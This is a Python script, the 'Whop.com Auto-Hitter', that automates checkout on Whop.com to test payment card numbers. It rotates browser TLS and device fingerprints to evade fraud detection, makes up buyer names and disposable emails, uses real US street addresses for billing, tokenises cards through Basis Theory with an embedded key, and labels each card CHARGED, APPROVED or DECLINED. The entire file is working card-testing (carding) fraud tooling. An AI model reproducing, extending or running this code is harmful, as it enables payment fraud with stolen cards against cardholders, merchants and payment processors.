#!/usr/bin/env python3
"""
Whop.com Auto-Hitter (curl_cffi Edition with Full Fingerprint Rotation)
Automated checkout & charge engine for Whop.com membership & product pages.
Features:
- curl_cffi AsyncSession with real browser TLS fingerprint emulation (impersonate="chrome131", "chrome133")
- Full realistic device profile rotation (User-Agent, sec-ch-ua, screen dimensions, WebGL vendor/renderer, timezones)
- Next.js RSC & structured JSON product plan resolution (avoiding $0.00 free tiers)
- Containerized Basis Theory card tokenization with Whop merchant container exchange
- Strict charge classification (zero false positives, real gateway decline extraction)
"""

import asyncio
import re
import uuid
import time
import json
import base64
import random
import logging
from typing import Optional, Dict, Any, Tuple, List
from urllib.parse import urlparse, parse_qs

import httpx
from curl_cffi.requests import AsyncSession

logger = logging.getLogger(__name__)

BT_API_KEY = "key_prod_us_pub_3gzPRk4Fuomp1aXof2qYWw"

# Realistic Device Profiles with synchronized TLS impersonate and WebGL data
DEVICE_PROFILES = [
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "impersonate": "chrome131",
        "platform": "Win32",
        "uaPlatform": "Windows",
        "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec_platform": '"Windows"',
        "width": 1920,
        "height": 1080,
        "depth": 24,
        "tz": -240,
        "hardwareConcurrency": 8,
        "deviceMemoryGb": 8,
        "uaBrands": [{"brand": "Google Chrome", "version": "131"}, {"brand": "Chromium", "version": "131"}, {"brand": "Not_A Brand", "version": "24"}],
        "webglVendor": "Google Inc. (Intel)",
        "webglRenderer": "ANGLE (Intel, Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0, D3D11)"
    },
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "impersonate": "chrome131",
        "platform": "Win32",
        "uaPlatform": "Windows",
        "sec_ch_ua": '"Not A(Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"',
        "sec_platform": '"Windows"',
        "width": 1536,
        "height": 864,
        "depth": 24,
        "tz": -300,
        "hardwareConcurrency": 12,
        "deviceMemoryGb": 16,
        "uaBrands": [{"brand": "Not A(Brand", "version": "8"}, {"brand": "Chromium", "version": "131"}, {"brand": "Google Chrome", "version": "131"}],
        "webglVendor": "Google Inc. (NVIDIA)",
        "webglRenderer": "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0, D3D11)"
    },
    {
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "impersonate": "chrome131",
        "platform": "MacIntel",
        "uaPlatform": "macOS",
        "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec_platform": '"macOS"',
        "width": 1440,
        "height": 900,
        "depth": 30,
        "tz": -420,
        "hardwareConcurrency": 8,
        "deviceMemoryGb": 16,
        "uaBrands": [{"brand": "Google Chrome", "version": "131"}, {"brand": "Chromium", "version": "131"}, {"brand": "Not_A Brand", "version": "24"}],
        "webglVendor": "Apple Inc.",
        "webglRenderer": "Apple M1"
    },
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "impersonate": "chrome131",
        "platform": "Win32",
        "uaPlatform": "Windows",
        "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec_platform": '"Windows"',
        "width": 2560,
        "height": 1440,
        "depth": 24,
        "tz": -300,
        "hardwareConcurrency": 16,
        "deviceMemoryGb": 32,
        "uaBrands": [{"brand": "Google Chrome", "version": "131"}, {"brand": "Chromium", "version": "131"}, {"brand": "Not_A Brand", "version": "24"}],
        "webglVendor": "Google Inc. (AMD)",
        "webglRenderer": "ANGLE (AMD, AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0, D3D11)"
    },
    {
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
        "impersonate": "chrome131",
        "platform": "MacIntel",
        "uaPlatform": "macOS",
        "sec_ch_ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        "sec_platform": '"macOS"',
        "width": 1680,
        "height": 1050,
        "depth": 30,
        "tz": -480,
        "hardwareConcurrency": 10,
        "deviceMemoryGb": 16,
        "uaBrands": [{"brand": "Not A(Brand", "version": "8"}, {"brand": "Chromium", "version": "132"}, {"brand": "Google Chrome", "version": "132"}],
        "webglVendor": "Apple Inc.",
        "webglRenderer": "Apple M2"
    }
]

TEMPMAIL_BRIDGE_URLS = [
    "http://127.0.0.1:8443",
    "http://2.24.107.198:8443",
]

DOMAINS = [
    "darkanons.tech",
    "darkanon.eu.cc",
    "darkanons.com",
    "darkanon.live",
    "darkanon.store",
    "thetechmens.com",
    "themain.pro"
]

FIRST_NAMES = [
    "Alex", "Aiden", "Andrew", "Anthony", "Austin", "Ben", "Brandon", "Brian", "Caleb", "Cameron",
    "Chris", "Christian", "Cole", "Colin", "Connor", "Daniel", "David", "Derek", "Dylan", "Eli",
    "Elijah", "Eric", "Ethan", "Evan", "Gabriel", "Hunter", "Ian", "Isaac", "Jack", "Jackson",
    "Jacob", "James", "Jason", "Jordan", "Joseph", "Joshua", "Justin", "Kevin", "Kyle", "Liam",
    "Logan", "Lucas", "Luke", "Mason", "Matthew", "Max", "Michael", "Nathan", "Nicholas", "Noah",
    "Oliver", "Owen", "Parker", "Ryan", "Sam", "Samuel", "Sean", "Tyler", "William", "Zachary",
    "Marcus", "Miles", "Arthur", "Carter", "Chase", "Dean", "George", "Julian", "Reed"
]

LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
    "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
    "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson",
    "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores",
    "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter", "Roberts", "Reed", "Cooper", "Morgan"
]

REAL_US_ADDRESSES = [
    {"line1": "1201 N Market St", "city": "Wilmington", "state": "DE", "postalCode": "19801"},
    {"line1": "1007 N Orange St", "city": "Wilmington", "state": "DE", "postalCode": "19801"},
    {"line1": "300 Delaware Ave", "city": "Wilmington", "state": "DE", "postalCode": "19801"},
    {"line1": "111 SW 5th Ave", "city": "Portland", "state": "OR", "postalCode": "97204"},
    {"line1": "1120 SW 5th Ave", "city": "Portland", "state": "OR", "postalCode": "97204"},
    {"line1": "201 W 8th Ave", "city": "Eugene", "state": "OR", "postalCode": "97401"},
    {"line1": "401 N 31st St", "city": "Billings", "state": "MT", "postalCode": "59101"},
    {"line1": "900 S Pavilion Dr", "city": "Manchester", "state": "NH", "postalCode": "03103"},
    {"line1": "1000 Elm St", "city": "Manchester", "state": "NH", "postalCode": "03101"},
    {"line1": "3601 C St", "city": "Anchorage", "state": "AK", "postalCode": "99503"},
]

def format_proxy(raw: Optional[str]) -> Optional[str]:
    if not raw:
        return None
    raw = raw.strip()
    if not raw:
        return None
    if raw.startswith(("http://", "https://", "socks5://", "socks4://")):
        return raw
    parts = raw.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    return f"http://{raw}"

async def get_tempmail_address() -> Tuple[str, str]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    full_name = f"{first} {last}"
    
    for base_url in TEMPMAIL_BRIDGE_URLS:
        try:
            async with httpx.AsyncClient(timeout=3) as client:
                r = await client.post(f"{base_url}/api/internal/generate-email", json={})
                if r.status_code == 200:
                    d = r.json()
                    email = d.get("email")
                    if email:
                        return full_name, email
        except Exception:
            continue

    domain = random.choice(DOMAINS)
    email = f"{first.lower()}.{last.lower()}{random.randint(10, 99)}@{domain}".lower()
    return full_name, email

class WhopHitter:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = format_proxy(proxy)
        self.profile = random.choice(DEVICE_PROFILES)
        self.user_agent = self.profile["ua"]

    async def hit(self, url: str, email: Optional[str], card: str) -> Dict[str, Any]:
        start_time = time.time()
        
        parts = card.split("|")
        if len(parts) != 4:
            return {
                "Response": "INVALID_FORMAT",
                "Status": "DECLINED",
                "Message": "Invalid card format (expected CC|MM|YY|CVV)",
                "Time": f"{time.time() - start_time:.2f}s"
            }
        
        cc, mm, yy, cv = parts
        mm = int(mm)
        if len(yy) == 2:
            yy = int("20" + yy)
        else:
            yy = int(yy)

        full_name, auto_email = await get_tempmail_address()
        if not email or email.strip().lower() in ["auto", "rand", "random", "none"]:
            buyer_email = auto_email
        else:
            buyer_email = email.strip()

        addr_template = random.choice(REAL_US_ADDRESSES)
        billing_addr = {
            "name": full_name,
            "line1": addr_template["line1"],
            "line2": "",
            "city": addr_template["city"],
            "state": addr_template["state"],
            "postal_code": addr_template["postalCode"],
            "country": "US"
        }

        parsed_url = urlparse(url)
        q_params = parse_qs(parsed_url.query)
        affiliate_code = q_params.get("a", [None])[0]

        profile = self.profile
        impersonate_target = profile.get("impersonate", "chrome131")

        headers_common = {
            "user-agent": profile["ua"],
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "origin": "https://whop.com",
            "referer": url,
            "whop-private-schema": "true",
            "sec-ch-ua": profile["sec_ch_ua"],
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": profile["sec_platform"],
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }

        async with AsyncSession(impersonate=impersonate_target, proxy=self.proxy, verify=False, timeout=30) as client:
            plan_id = None
            url_plans = re.findall(r'\bplan_[a-zA-Z0-9]{12,18}\b', url)
            if url_plans:
                plan_id = url_plans[0]

            if not plan_id:
                try:
                    r_page = await client.get(url, headers={"user-agent": profile["ua"]})
                    page_html = r_page.text
                    
                    # Parse structured plan definitions with free indicator
                    pattern = r'\{id:"(plan_[a-zA-Z0-9]{12,18})",free:(!0|!1)(?:,[^}]+?formattedPeriodV2:"([^"]+)")?'
                    matches = re.findall(pattern, page_html)
                    
                    parsed_plans = []
                    seen_pids = set()
                    for pid, free_val, period in matches:
                        if pid not in seen_pids:
                            seen_pids.add(pid)
                            parsed_plans.append({
                                "id": pid,
                                "free": free_val == "!0",
                                "period": (period or "").lower()
                            })
                    
                    slug = parsed_url.path.rstrip("/").split("/")[-1].lower()
                    
                    if "month" in slug:
                        for p in parsed_plans:
                            if not p["free"] and "month" in p["period"]:
                                plan_id = p["id"]
                                break
                    elif "year" in slug or "annual" in slug:
                        for p in parsed_plans:
                            if not p["free"] and "year" in p["period"]:
                                plan_id = p["id"]
                                break

                    if not plan_id:
                        paid = [p["id"] for p in parsed_plans if not p["free"]]
                        if paid:
                            plan_id = paid[0]
                    
                    if not plan_id:
                        html_plans = re.findall(r'\bplan_[a-zA-Z0-9]{12,18}\b', page_html)
                        if html_plans:
                            plan_id = html_plans[0]
                        else:
                            r_rsc = await client.get(url, headers={"user-agent": profile["ua"], "RSC": "1", "accept": "text/x-component"})
                            rsc_plans = re.findall(r'\bplan_[a-zA-Z0-9]{12,18}\b', r_rsc.text)
                            if rsc_plans:
                                plan_id = rsc_plans[0]
                except Exception as e:
                    return {
                        "Response": "PAGE_ERROR",
                        "Status": "DECLINED",
                        "CC": card,
                        "Email": buyer_email,
                        "Plan": "N/A",
                        "Message": f"Failed to load product page: {str(e)}",
                        "Time": f"{time.time() - start_time:.2f}s"
                    }

            if not plan_id:
                return {
                    "Response": "NO_PLAN_FOUND",
                    "Status": "DECLINED",
                    "CC": card,
                    "Email": buyer_email,
                    "Plan": "N/A",
                    "Message": "Could not extract plan_id from Whop link",
                    "Time": f"{time.time() - start_time:.2f}s"
                }

            prod_slug = parsed_url.path.strip("/").split("/")[0] if parsed_url.path.strip("/") else ""
            checkout_payload = {
                "items": [{"plan": plan_id, "quantity": 1}],
                "attribution": {"source": "product_page_direct"}
            }
            if affiliate_code:
                checkout_payload["affiliate_code"] = affiliate_code
                checkout_payload["tracking_link_ids_by_account"] = {}
                checkout_payload["affiliate_code_candidates"] = {
                    "global": affiliate_code,
                    "by_product": {prod_slug: affiliate_code} if prod_slug else {}
                }

            try:
                r_sess = await client.post(
                    "https://whop.com/api/v1/checkout_sessions",
                    headers={**headers_common, "content-type": "application/json"},
                    json=checkout_payload
                )
                if r_sess.status_code not in (200, 201):
                    err_txt = r_sess.text[:150]
                    return {
                        "Response": "CHECKOUT_INIT_FAILED",
                        "Status": "DECLINED",
                        "CC": card,
                        "Email": buyer_email,
                        "Plan": plan_id,
                        "Message": f"Checkout init failed (HTTP {r_sess.status_code}): {err_txt}",
                        "Time": f"{time.time() - start_time:.2f}s"
                    }
                sess_data = r_sess.json()
                checkout_id = sess_data.get("id")
                client_secret = sess_data.get("client_secret")
                account_id = sess_data.get("seller", {}).get("id")

                # Prime breakdown with affiliate attribution
                try:
                    await client.post(
                        f"https://whop.com/api/v1/checkout_sessions/{checkout_id}/calculate_breakdown",
                        headers={**headers_common, "content-type": "application/json"},
                        json={"client_secret": client_secret, "supports_buyer_fee": True}
                    )
                except Exception:
                    pass
            except Exception as e:
                return {
                    "Response": "INIT_EXCEPTION",
                    "Status": "DECLINED",
                    "CC": card,
                    "Email": buyer_email,
                    "Plan": plan_id,
                    "Message": str(e),
                    "Time": f"{time.time() - start_time:.2f}s"
                }

            # Containerized Basis Theory Card Tokenization with rotating device profile
            bt_headers = {
                "user-agent": profile["ua"],
                "bt-api-key": BT_API_KEY,
                "content-type": "application/json",
                "origin": "https://js.basistheory.com",
            }
            device_info = {
                "uaBrands": profile["uaBrands"],
                "uaMobile": False,
                "uaPlatform": profile["uaPlatform"],
                "languages": ["en-US"],
                "timeZone": "America/New_York",
                "cookiesEnabled": True,
                "localStorageEnabled": True,
                "sessionStorageEnabled": True,
                "platform": profile["platform"],
                "hardwareConcurrency": profile["hardwareConcurrency"],
                "deviceMemoryGb": profile["deviceMemoryGb"],
                "screenWidth": profile["width"],
                "screenHeight": profile["height"],
                "devicePixelRatio": 1.0,
                "maxTouchPoints": 0,
                "webdriver": False,
                "webglVendor": profile["webglVendor"],
                "webglRenderer": profile["webglRenderer"]
            }

            try:
                # 1. Create BT session
                r_bts = await client.post("https://js.basistheory.com/api/sessions", headers=bt_headers, json={"deviceInfo": device_info})
                bts_data = r_bts.json() if r_bts.status_code in (200, 201) else {}
                session_key = bts_data.get("session_key")
                nonce = bts_data.get("nonce")

                if not session_key or not nonce:
                    return {
                        "Response": "BT_SESSION_FAILED",
                        "Status": "DECLINED",
                        "CC": card,
                        "Email": buyer_email,
                        "Plan": plan_id,
                        "Message": f"Basis Theory session creation failed (HTTP {r_bts.status_code})",
                        "Time": f"{time.time() - start_time:.2f}s"
                    }

                # 2. Exchange nonce for merchant container
                r_ws = await client.post(
                    "https://whop.com/api/v1/payment_method_types/card/session",
                    headers={**headers_common, "content-type": "application/json"},
                    json={"account_id": account_id, "nonce": nonce}
                )
                ws_data = r_ws.json() if r_ws.status_code in (200, 201) else {}
                container = ws_data.get("session", {}).get("container")

                if not container:
                    return {
                        "Response": "CONTAINER_FAILED",
                        "Status": "DECLINED",
                        "CC": card,
                        "Email": buyer_email,
                        "Plan": plan_id,
                        "Message": f"Card container exchange failed (HTTP {r_ws.status_code})",
                        "Time": f"{time.time() - start_time:.2f}s"
                    }

                # 3. Tokenize card number with container
                r_tok = await client.post(
                    "https://js.basistheory.com/api/tokens",
                    headers=bt_headers,
                    json={"type": "card", "containers": [container], "data": {"number": cc}}
                )
                tok_data = r_tok.json() if r_tok.status_code in (200, 201) else {}
                bt_token = tok_data.get("id")

                if not bt_token:
                    return {
                        "Response": "TOKEN_ERROR",
                        "Status": "DECLINED",
                        "CC": card,
                        "Email": buyer_email,
                        "Plan": plan_id,
                        "Message": "Failed to tokenize card into container",
                        "Time": f"{time.time() - start_time:.2f}s"
                    }

                # 4. Patch expiration and CVC
                patch_headers = {**bt_headers, "bt-api-key": str(session_key), "content-type": "application/merge-patch+json"}
                await client.patch(
                    f"https://js.basistheory.com/api/tokens/{bt_token}",
                    headers=patch_headers,
                    json={"data": {"expiration_month": mm, "expiration_year": yy}}
                )
                if cv:
                    await client.patch(
                        f"https://js.basistheory.com/api/tokens/{bt_token}",
                        headers=patch_headers,
                        json={"data": {"cvc": str(cv).strip()}}
                    )

            except Exception as e:
                return {
                    "Response": "BT_EXCEPTION",
                    "Status": "DECLINED",
                    "CC": card,
                    "Email": buyer_email,
                    "Plan": plan_id,
                    "Message": str(e),
                    "Time": f"{time.time() - start_time:.2f}s"
                }

            conf_payload = {
                "account_id": account_id,
                "payment_method": {
                    "type": "card",
                    "category": "card",
                    "card": {"token": bt_token}
                },
                "billing_details": {
                    "email": buyer_email,
                    "name": full_name,
                    "address": {
                        "country": "US",
                        "line1": billing_addr["line1"],
                        "city": billing_addr["city"],
                        "state": billing_addr["state"],
                        "postal_code": billing_addr["postal_code"]
                    }
                },
                "return_url": url,
                "setup_future_usage": "off_session",
                "browser_info": {
                    "platform": profile["platform"],
                    "color_depth": profile["depth"],
                    "screen_height": profile["height"],
                    "screen_width": profile["width"],
                    "javascript_enabled": True,
                    "language": "en-US",
                    "java_enabled": False,
                    "browser_time_difference": profile["tz"]
                }
            }

            try:
                r_conf = await client.post(
                    "https://whop.com/api/v1/confirmation_tokens",
                    headers={**headers_common, "content-type": "application/json"},
                    json=conf_payload
                )
                conf_data = r_conf.json() if r_conf.status_code in (200, 201) else {}
                ctok_id = conf_data.get("id")
                if not ctok_id:
                    err_msg = conf_data.get("message") or conf_data.get("error", "Failed to build confirmation token")
                    return {
                        "Response": "CONFIRM_TOKEN_FAILED",
                        "Status": "DECLINED",
                        "CC": card,
                        "Email": buyer_email,
                        "Plan": plan_id,
                        "Message": str(err_msg),
                        "Time": f"{time.time() - start_time:.2f}s"
                    }
            except Exception as e:
                return {
                    "Response": "CONF_EXCEPTION",
                    "Status": "DECLINED",
                    "CC": card,
                    "Email": buyer_email,
                    "Plan": plan_id,
                    "Message": str(e),
                    "Time": f"{time.time() - start_time:.2f}s"
                }

            confirm_payload = {
                "client_secret": client_secret,
                "confirmation_token": ctok_id,
                "attestations": {"tos_accepted": True}
            }

            try:
                r_confirm = await client.post(
                    f"https://whop.com/api/v1/checkout_sessions/{checkout_id}/confirm",
                    headers={**headers_common, "content-type": "application/json"},
                    json=confirm_payload
                )
                confirm_data = r_confirm.json() if r_confirm.status_code in (200, 201) else {}
            except Exception as e:
                return {
                    "Response": "CONFIRM_EXCEPTION",
                    "Status": "DECLINED",
                    "CC": card,
                    "Email": buyer_email,
                    "Plan": plan_id,
                    "Message": str(e),
                    "Time": f"{time.time() - start_time:.2f}s"
                }

            # Check immediate confirm response
            last_err = confirm_data.get("last_confirm_error")
            if last_err:
                err_msg = last_err.get("message") or last_err.get("code") or "Payment Confirmation Failed"
                err_lower = err_msg.lower()
                is_approved = any(k in err_lower for k in ["insufficient funds", "incorrect cvc", "security code", "3d", "authenticate", "zip code"])
                return {
                    "Response": err_msg,
                    "Status": "APPROVED" if is_approved else "DECLINED",
                    "Gate": "Whop / Multi-PSP",
                    "Plan": plan_id,
                    "Email": buyer_email,
                    "OTP": "N/A",
                    "CC": f"{cc}|{mm:02d}|{yy}|{cv}",
                    "Charged": "False",
                    "Approved": str(is_approved),
                    "Time": f"{time.time() - start_time:.2f}s"
                }

            # Polling to observe actual payment settlement
            final_status = confirm_data.get("status", "unknown")
            final_message = ""
            is_charged = False
            is_approved = False

            init_payment = confirm_data.get("payment") or {}
            if init_payment.get("status") == "succeeded":
                is_charged = True
                final_message = "Order Placed Successfully"

            if not is_charged:
                for _ in range(6):
                    await asyncio.sleep(2)
                    try:
                        r_poll = await client.get(
                            f"https://whop.com/api/v1/checkout_sessions/{checkout_id}?client_secret={client_secret}",
                            headers=headers_common
                        )
                        poll_data = r_poll.json()
                        final_status = poll_data.get("status", final_status)
                        payment = poll_data.get("payment") or {}
                        pay_status = payment.get("status")
                        poll_err = poll_data.get("last_confirm_error")

                        if poll_err:
                            err_code = poll_err.get("decline_code") or poll_err.get("code") or ""
                            err_msg = poll_err.get("message") or err_code or "Card Declined"
                            final_message = f"{err_msg} ({err_code})".strip() if err_code and err_code not in err_msg else err_msg
                            break

                        if pay_status == "succeeded":
                            final_message = "Order Placed Successfully"
                            is_charged = True
                            break
                        elif pay_status == "failed":
                            fail_msg = payment.get("failure_message") or payment.get("decline_code") or "Payment Failed / Card Declined"
                            final_message = fail_msg
                            break
                    except Exception:
                        pass

            elapsed = time.time() - start_time
            if not final_message:
                if is_charged:
                    final_message = "Order Placed Successfully"
                else:
                    final_message = "Payment Processing / Incomplete"

            msg_lower = (final_message or "").lower()
            is_approved = is_charged or any(k in msg_lower for k in [
                "insufficient funds", "incorrect cvc", "security code", "3d", "authenticate", "zip code", "action_required"
            ])

            status_label = "CHARGED" if is_charged else ("APPROVED" if is_approved else "DECLINED")

            return {
                "Response": final_message if final_message else status_label,
                "Status": status_label,
                "Gate": "Whop / Multi-PSP",
                "Plan": plan_id,
                "Email": buyer_email,
                "OTP": "N/A",
                "CC": f"{cc}|{mm:02d}|{yy}|{cv}",
                "Charged": str(is_charged),
                "Approved": str(is_approved),
                "Time": f"{elapsed:.2f}s",
                "Details": {
                    "checkout_id": checkout_id,
                    "final_status": final_status,
                }
            }

if __name__ == "__main__":
    import sys
    target_url = "https://whop.com/arts-crypto-circle/arts-crypto-circle-monthly23/?a=wickyone"
    target_card = "4242424242424242|05|2028|123"

    if len(sys.argv) > 1:
        target_card = sys.argv[1]
    if len(sys.argv) > 2:
        target_url = sys.argv[2]

    hitter = WhopHitter()
    res = asyncio.run(hitter.hit(target_url, None, target_card))
    print(json.dumps(res, indent=2))
